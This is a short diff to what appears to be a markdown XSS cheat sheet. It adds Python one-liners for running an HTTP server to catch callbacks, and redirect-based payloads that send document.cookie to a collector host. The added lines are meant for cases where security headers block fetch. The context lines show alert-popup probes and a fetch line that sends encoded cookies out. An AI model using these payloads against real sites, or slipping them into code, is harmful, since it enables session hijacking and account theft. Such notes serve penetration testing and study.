@@ -1,3 +1,7 @@
+## Python server
+
+`python3 -m http.server [PORT]`
+`python2 -m SimpleHTTPServer [PORT]`
 # Basic JavaScript popups
 `<script>alert(0)</script>`
 `<img src='x' onerror='alert(0)'>`
@@ -21,6 +25,10 @@ Ensuring the content is treated as a sting:
 
 Encoding content which has characters that can mess with things:
 `fetch("http://127.0.0.1?x="+encodeURIComponent(JSON.stringify(document.cookie)))`
+
+In event that certain security headers are applied, the fetch method may no longer work. Instead, the below could be used to force a redirect.
+`window.location.href = "http://127.0.0.1?x="+JSON.stringify(document.cookie)`  
+`window.location.replace("http://127.0.0.1?x="+JSON.stringify(document.cookie))`
 
 # Odds N' Ends
 
